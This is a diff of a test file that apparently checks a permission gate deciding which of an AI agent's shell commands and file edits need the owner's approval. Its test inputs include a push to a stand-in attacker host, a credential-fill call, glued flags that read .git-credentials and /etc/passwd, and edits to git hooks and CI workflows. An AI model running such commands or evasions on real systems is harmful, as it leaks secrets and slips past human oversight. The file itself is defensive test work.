@@ -129,10 +129,89 @@ def test_anything_but_one_plain_allowed_command_goes_to_the_owner(place, command
 
 @pytest.mark.parametrize(
     "command",
-    ["git fetch https://example.invalid/r.git", "git clone git@example.invalid:o/r.git", "git pull ssh://h/r"],
+    ["cat evilhost:repo", "ls git@example.invalid:o/r.git", "grep x https://example.invalid/a"],
 )
 def test_a_command_naming_a_web_address_or_another_machine_goes_to_the_owner(place, command):
+    assert bash(command, place) is not None  # only the colon tells: each would pass as a path in the repo
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "git push origin feat",
+        "git push evilhost:repo HEAD",
+        "git remote set-url origin x",
+        "git config core.pager x",
+        "git clone x",
+        "git submodule update",
+        "git credential fill",
+        "git -c core.pager=x log",
+        "git -C.. status",
+        "git fetch origin",
+        "git rebase -x make main",
+        "git rebase --exec=make main",
+        "git",
+        "npm publish",
+        "npm login",
+        "npm exec x",
+        "npm",
+        "uv publish",
+        "uv tool run x",
+        "uv pip install x",
+    ],
+)
+def test_a_subcommand_off_the_approvers_list_goes_to_the_owner(place, command):
     assert bash(command, place) is not None
+
+
+@pytest.mark.parametrize(
+    "command", ["git fetch origin", "git fetch evil", "git rebase -x make main", "git rebase --exec=make main"]
+)
+def test_git_that_reaches_a_named_remote_or_runs_a_command_goes_to_the_owner(place, command):
+    assert bash(command, place) is not None
+
+
+@pytest.mark.parametrize("command", ["git fetch", "git diff", "uv sync", "npm ci", "npm run lint", "make test"])
+def test_a_subcommand_on_the_approvers_list_may_be_answered(place, command):
+    assert bash(command, place) is None
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "uv run --with x pytest",
+        "uv run --with=x pytest",
+        "uv run --with-requirements r.txt pytest",
+        "uv run --from x y",
+        "uv run --index x pytest",
+        "uv run --extra-index-url x pytest",
+        "uv run --find-links x pytest",
+    ],
+)
+def test_uv_run_that_fetches_other_code_goes_to_the_owner(place, command):
+    assert bash(command, place) is not None
+
+
+def test_make_that_sets_a_variable_goes_to_the_owner(place):
+    assert bash("make CC=x", place) is not None
+    assert bash("make test SHELL=x", place) is not None
+
+
+@pytest.mark.parametrize(
+    "command",
+    ["grep -rf/home/u/.git-credentials x .", "grep -rf.. x src", "ls -C..", "head -c/etc/passwd src/a.py"],
+)
+def test_a_value_glued_to_a_short_flag_is_judged_as_a_path(place, command):
+    assert bash(command, place) is not None
+
+
+@pytest.mark.parametrize(
+    "path",
+    [".git/config", ".git/hooks/pre-push", ".github/workflows/ci.yml", ".claude/skills/x/SKILL.md", "sub/.claude/x"],
+)
+@pytest.mark.parametrize("name", ["Edit", "Write"])
+def test_an_edit_of_git_workflow_or_claude_files_goes_to_the_owner(place, name, path):
+    assert tool(name, {"file_path": str(place.repo / path)}, place) is not None
 
 
 @pytest.mark.parametrize(
